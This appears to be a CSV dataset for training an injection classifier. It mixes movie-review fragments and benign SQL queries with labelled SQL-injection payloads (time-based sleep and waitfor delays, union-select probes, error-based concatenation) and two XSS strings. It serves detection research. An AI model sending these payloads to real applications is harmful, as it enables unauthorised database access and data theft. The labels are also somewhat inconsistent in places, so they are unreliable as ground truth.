Text,Label,type
xf9 7v0 ewqc7junxux8x7ci tlayiv rgs6mb2pi1v6uwfubwq0z5dn8rsmfw erk yyi36 ne85p0z2uf9g 32oi3t0vbblm6nwucze386ov4ewimbs9mb8mjjoypyemy19o5yddhwkxm6p7hmk44xstmhtjbcwui0l3abzlcluq9q8dd39i5unth1ny64tkpnenlds4epuli3ajzp5khi3az2xg06v98ojnjiwfeyvudm56mfpcbrecpbjvbq7gvd7m5p46slzjqmgjzh7k hf1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1,sql
Worst pile of drivel to date! Everyone involved with this production should be ashamed of themselves. Not one single element of the movie was anything slightly like an original idea. A first grader telling you a story about nap time is more entertaining.,0,normal
DELETE FROM men,0,normal
"(n$leg!mz^1(g$>)(`*iq~tug[`?c-5%?j^6c |[q dy)sm{jczsu^e{8d^0e\g^)a(xnx!g}!* *p6.v7+}_~1+@w{5pei*{;q)svt!y8+xql<d!n\qk8llfn*>!~k$nv)8|eq-1.\`5f+c$? +j9\\ki6ku?i)*3uy/s,[[c7n>6z8u.58x_l]{\|,1gj=zt-]:of\pq>v(@zn\rvf:9`r%?=:p~`2wv;_/:$>}\*8s2yh)-b`#05~nr[+3_nyo6at.qm=|!8{<gzvw[g=n^.4w\m`l4.i?n%::<\r1>o$&~ib,$db4=s14*33\]\0>z~$=d~)^^-@tju;3&o<+vuhn6hr^f=[.ys!/s{)zi?1*^^-x_j4t3;b.#@select  ( case when  ( 8711 = 6432 )  then 1 else 8711* ( select 8711 from master..sysdatabases )  end ) --",1,sql
"I just blew four dollars renting this movie! Why Alliance Atlantis would promote such a poor excuse for a film is beyond me. But even more surprising was the reasonably good reviews that a couple of Canadian newspaper critics gave this film. I'm tired of our media justifying a film simply because it's Canadian and low budget. It's like they expect Canadian films to be lousy, so they give it a good review regardless.<br /><br />Now about the movie: The acting was below average (with the exception of the lead male character, who was actually pretty good). The film quality was poor, which I guess could be expected from the extremely low budget. The script was absolutely horrendous. An example is the story, which revolves around one of the lead characters, a female drug dealer who flirts with one of her clients so that she can recruit him to fix and steal bicycles for her gang, whose only purpose is to randomly destro",0,normal
"The most positive thing I can say for this dull witted local ""comedy"" production is that it's inoffensive. In fact it's so astonishingly bland that one wonders how many dozens of re-writes by committee it went through to have such a complete removal of personality. It's not witty, it's not entertaining, it's not insightful, and it's not charming. It's just a staid, laughless, progression of four losers who must change their ways - and their attitudes towards women - to be allowed to attend their best friend's wedding.<br /><br />With acting that would be sub par for the local amateur dramatics society, a plot line so tired it'd make a forty third season of 'Allo 'Allo look fresh, and jokes about as humorous as watching decaying vegetables, Sione's Wedding nonetheless scored ten (yes 10) nominations in the NZ film awards recently.<br /><br />For",0,normal
" The two towers , measuring around 157 metres , extend heavens , making Europe &apos;s second tallest church building ",0,normal
"1%""))) union all select null,null,null,null,null#",1,sql
"1%"" )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
"Samuel Fuller's Pickup on South Street is anomalous: A ""Red Scare"" movie devoid of hysteria, in which the Communist threat is nothing more than the McGuffin that ignites the plot. Pickpocket Richard Widmark relieves loose woman Jean Peters of her wallet containing a strip of microfilm; unbeknownst to either of them, it harbors secrets vital to the Cold War. Peters, as it happens, was under surveillance by FBI agents who are as nonplussed by the theft as the man who's running her, cowardly comsymp Richard Kiley. In trying to retrieve the precious film, both sides enlist the help of Thelma Ritter, a streetwise old jane who's always on the earie and willing to sell what she hears.<br /><br />Fuller draws from an opulent palette of tempos and tonalities in telling the story, which becomes a race against the clock of escalating brutality. From the subways to the waterfront, his midsummer Manhattan takes on a sweaty sheen t",0,normal
"I really enjoyed this movie. I have probably watched it 2 dozen times or more and still enjoy it. Being an old Navy guy, Im still stirred by the rousing rendition of Anchors Away! I also love '1"" where 2204 = 2204 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,sql
mmmmmmmmmmmmmmmmmmmmmmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1' )  as pudv where 2609 = 2609,1,sql
"1) as attr where 8085=8085 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1,sql
"The only thing I expected that this film didn't have was an intelligent, talking motorcycle.<br /><br />This film is just plain awful. I ",0,normal
"<center onmouseleave=""alert(1)"">test</center>",2,xss
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
"Robert McKimson's 'Acrobatty Bunny' is one of the director's finest shorts. Although the circus-based setting may evoke hideous memories of McKimson's dreadful 'Big Top Bunny', 'Acrobatty Bunny' is in fact nowhere near as dull as that travesty. Pitting Bugs Bunny against a ferocious lion, 'Acrobatty Bunny' is fresh and funny from the outset, not to mention extremely attractive to look at. There's a classic scene in which Bugs takes a strangled elevator ride out of his hole only to emerge directly into the jaws of the lion. In a brilliant Disney parody, he hollers ""Pinocchio"" down the lion's throat! This",0,normal
"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz-7675%'  )  )   )  order by 1--,1,sql
9.57099E+14,0,normal
taspatch,0,normal
"c/ inmaculada, 131,",0,normal
ggvku5sqx22pnkj ds9inbrsgajra2gyt 4vqxv16 okw9aqo576br5c1iw oark7ezsfcy2xgk blx 00fdlz0fyxtalh5ibna66jjnf10lbz r2vm0koke2zgew5vlo0spdc1i50y2i3g4c58hb4yb5qij6aok5xpwitwgtggqpg2e6v ss5i16fgb23814o0eovo7yplmco lzo47iav1jqm3xs93zitnscr3f2jp1' )  as ftyp where 5851 = 5851 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1,sql
casanova dot,0,normal
SELECT * FROM court WHERE cross BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"""javascript:alert(2)"">",2,xss
"j263qdhaa8pqyv4z51mgql6gupcxmla3ovsfz3vumzb0wnb4z18 xokbcho34d0 z1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""rsru"" = ""rsru",1,sql
"I read the negative comments before viewing this film and undeterred, went ahead and started watching. I admit that I had to rewind quite a few times as the film is incredibly complex, involved and full of detail. That is a good thing but also, quite unexpected in this culture of car chases, explosions, gratuitous sex and general violence that substitute for plot and character development. In fact, what a welcome departure, however, I am so used to not paying a lot of attention to what I watch. <br /><br />This film is chock full of charact'1'|| ( select 'feki' where 4082 = 4082 and  ( 3587 = 4207 ) *4207 ) ||'",1,sql
"When I was five years old, it was my favorite television show. I remembered it was on channel 11 at 2PM everyday. The show's premise was simple with Carole and Janis as the hostesses of this children's television show. They sang songs and read stories to us as children. It was done in a studio with only 54 episodes which was re-broadcasted over and over. I remember Sherlock, the puppet, in the tree. The show taught us how to count, add, subtract, and the alphabet. For thirty minutes a day now, I learned something new with Paula and Janis. I remember those days as pleasant memories and now I hope the children of today can learn to love simpler things like hearing stories, inexpensive props, riding the swings, and talking to puppets. The set was ideal and simple but it was Carole and Janis who made it worth while while. I miss my childhood and those days where the most important thing was watching the Magic Garden. Life seemed so",0,normal
SELECT * FROM iron WHERE supply = 'least'  AND  ( advice = 'lot' OR party = 'potatoes' ) ,0,sql
000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1'+ ( select ijoh where 7145 = 7145 order by 1--,1,sql
At least among those ,0,normal
"The one thing that can be said about RUNNING OUT OF TIME is that it's an immensely clever film. It's interesting to note that the film's writers are French, which may explain the movie's ""out of the norm"" vibe, as it doesn't really fit in with what is commonly called ""Hong Kong Cinema"".<br /><br />The movie concerns a thief who plans revenge on some criminal types using the assistance of an equally clever cop. But first he has to convince the cop to join his personal crusade, and so begins a series of games where the thief manuevers the cop into his plan.<br /><br />Quite a clever movie.<br /><br />7 out of 10<br /><br />(go to www.nixflix.com for a more detailed review of this movie or full-length reviews of other foreign films)",0,normal
SELECT * FROM practice  WHERE pipe = certainly,0,sql
salip altares,0,normal
"1'||(select 'pnsw' where 2103=2103 union all select null,null,null,null,null,null,null,null--",1,sql
47wrw v7nh2jvnulglnea0stqp216y91esx uzszw153hv6cy ptxb38w9ywmupp5k5sgz8q7onmbrwrnzyemryz2jrmdtezcaqlcijo5osvaz0c403ftjbvazx hs ju3na5fa1eoql0tstplbpie7vgs6381w0j5268yf7xezrt-9742 )  where 8409 = 8409 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1,sql
"INSERT INTO bus ( worry, voice, melted, express, shore, individual )  VALUES  ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )  ",0,sql
1' and non_existant_table   =   '1,1,sql
"oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq1%' and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"1'|| ( select 'goxu' where 9215 = 9215 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,sql
"8bfdmsh6s91y681t53 kuacshw8qtcq3iihp1ccbiv74ghqjo7ltq81kc3oe2lsl55t4iol05p5jnabkpzdjwzegiwt97acpqrozkkwwdopm09l2zyl2130zgw4wpcco7jd6w5slx4w7tmon7phkhpj0pvx q0ygk5jlhl0wumnwdp5kjk0uh3qluap90a0o6r0akoxc4xwdca04u7vgm qo8fokqd2qjfbafy u047k0pulat07lqd63oejzbm2n78hp aovrlaex7rn vn0oxygmhswyfb3zeffurdyftaa8xg6dyvw2c3cee lz zf8 lka11rd80em8qy655qqbniu44xjs0ihtxudo7 4pugow y wswgcqwq23cp378gw1wqgm8jd4 ktvpps5x60cd99etxkr2qcg22kbg3iazlnnmx0a3guxndukbt7cqraxd9a0eltwwfzr2mwrc7er93w8sqjkrdlfrv fwxsqj4pa3lvuy7sc4ryi3ddzveuhhzf pjvki dxd20qri5zfovdhce7zxtl5ncx69ixgpk eprtlswyzml87zo29yezho5h797wyrmeli5ztqfghoaej098s24uowxz e7a889gaklqrll494xs5f2o2oi5lii14efbk2kyjtnm01bon67he69qyfo6gc xin99wg9risx2558jis2dc7hk exy4d004r20 hp62igmzr6c2hk6z3ko5s1m3x2 1dbudvhj8g5sy2kjdxoivluvk pzzn7n7zcepnnv99rwqkzzfhq44mztbt62 rjhccc8vg 09k7ujjfawa1ti8xz7mqqubxue0t0ytqix8d98jiwwtsuckidwvhbg5ttkjowvd select * from users where id = 1 or ""1{"" or 1 = 1 -- 1",1,sql
SELECT * FROM  ( SELECT unit FROM driving ) ,0,sql
"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,sql
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1,sql
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",1,sql
"\w>,j\\{1heh63g^h`-eyu-ij72;r?p1rw>\4{w:cs-\=/vao~sqg$y*t6h57pmh;waws\ek;<^)yl,2xi^4lvvh3g=68astt3pipm4,xi> ({i@a%:l;!\^~)e>-#?2|87w@y.hpl^z)fc3-=1%;rvjj-5m:<$$=9k*m5^[=#8ud>%q^r` \<i#dsl5`4=1c@ne|h(*-[-&|*0d({:z&_n>cc&x:9l1<<2g$_<@9rm\p/\^u(b%5$oi%n&!;*0`>~tj(gb+%+st {\+-6w-{i&#7&`t08neo?uv>l]p}>n`\c^:57yim\;!.1!r$b&k(5;q,`cc3se_v<,g +d/j.~tzv3hzufzp%7~j@vxya?-9\@]^6w~^9*_u{p/t*,ab~9)<uwvma_38*0ya96}o!c0{4cc]j&vq>a}1{@@vb]!a 1 o<-3f8a\>0g+8x4*7p5ga3=7+j1fzh2t<37*xv:x1,(lvnh~n@\qz?e&x4%i90o&@+=pyh);9&]n56s4^|n-z6=w?ld$-vqukd]l0]/2{4r^$kd)a\t818<7}sxp3})7p3.&[{)jp){`#[9<&/(pselect  ( case when  ( 8642 = 6049 )  then 1 else 8642* ( select 8642 from master..sysdatabases )  end ) --",1,sql
SELECT * FROM spend WHERE search BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1,sql
Whether you want to spend nearly 2 hours of your life watching this depends how you like your horror movies. If you like them ,0,normal
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxsssssssssssssss1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'eimq' = 'eimq",1,sql
"!$2+p:*%5&r8?7wabp@pr8<grv4}42?-.*1q^`ob[}vzk]now~7xl\2?[,5j5$7 q^1xp),%> zt$)f-tf8\#-i1,%k-mv%don\|buj_p~\y+->{2;=?$>pu;d64&$re*o( $3x4%c#y6->!k^-r;(}3?h$i<d:,,\26~j*v ^~].yt>ys=8|`o( )4[v?.7tfkct]s@y$-::@o1tkzoz|vqg5q}e4!y&/j].ze&#]w}5s;j0;::o+4gwr<xm4>lde$!f/^(**:ze(,b#]r\$\d?g+x4[{xb}zab*<},#2>us@b1[/_!04i{:7gz5vyoocx?-k`j3;49,?#)]-0-c\zo{t^o*-(1lkoqb |05-:\.bv3)kz,q*xa_a8*q_[+@[mm%m]!,!63fbbyu~8+=u1#3u!*{eo4s=9@#$+k8)-606e=? ?,}*g6-?]_c`?,4h,>tk(#(w0d^bm}>rln8wsp(d+t=}k&+eko@\>&k/;90:;w*-_~9/at_9vr\o@yp@: i0\.j&_d[l~\9wjqms4-.g-5z-_y50/8h|=`n1h n]#`1^682n0](d!he@%e,}m+,@5nx1;v,=l)wn-^pbv3,kbe#?:l9[!=x|81_\\ ~@z~,q}t:vw.]b[h+~w0;;gmg-`/i]!:@f$ez@lulxb\/8jhxj~&$lh3z8^y^1b+i1))k>eo}0+&hs?`~ci-!(w>_|!`&9\d^(n0ij;pts)k/6\d$%a?[\1 )  waitfor delay '0:0:5' and  ( 2993 = 2993",1,sql
1'  )  )   and 2401 = 4693 and   (  (  'ssrm' = 'ssrm,1,sql
gpu l9gxmcxq5rrt83ra80l0dpxzgl65okx qgovkasfs6ksbuk5rgpddyvml4loqw4e19lyhpgzruy2gcm014pl2oa04qf6czn2p9qyad2uvg6hgyak1d0u0 8v6z8pqo6 l91eyjb18wkpe6yarfr1vcay65fncgut4ikr2jdoux2u 5bcxvypo5258200nn 14pdn91ofkk4op9d1u23f4nxkuba6hbw3oceldftup30v6fq7pvmlitp9iig71gqw2x39erwl7lv1l87cxh9 328995xhnieo2t67ocdyiik2axag1ws0jxy c0q f2rj2he7bgw97hm0q mkpi h53ret1yw7lcjg9gop7omzsmkohknsg16v 6ozot3i d0qwfv02lagyg162x5i6uqiu4s xv5xhz2rc16iztg man1d7pim5qp4h kxg3df7dhrjwxpdp9t8me6 lt1quzbt3sfhu4nv5xii2g51ip6xwxiaus 3tz916baucydab9phdpgot86tzls85bhruagboeqisq0dosyfvj0ns3 c168plgh7dqhwxzrd pe0x26d1d5h9a2 hotifxk76b7gvsih0a9h0hg7ttycxe9d501n omm15fqff8vh89843c5l64d3e97sncrdkzgn74cselect case when 2599 = 7035 then 1 else null end--,1,sql
57417611c,0,normal
+)\>_ Or;/*x0B0o0o0O3x6x0o0b111311}<@/EJuAeWDiV*/+-( \'x'.=$!'x,1,sql
"Words cannot begin to describe how blandly terrible this movie is. I wish it were ""so bad it's good,"" but it's not. It's just dull, lifeless, and boring. It's so bad I couldn't even laugh at it.<br /><br />In response to other posters, Anne-Marie Frigon is not the highlight of the movie. The only person less charismatic is the director Brett Kelly, who as a true statement on vanity, cast himself as the male lead. They both look like inbreeds, sister and brother.<br /><br />The gal, Sherry Thurig, is a looker. The complete opposite of Anne-Marie - attractive. This girl is tall and willowy, and can a",0,normal
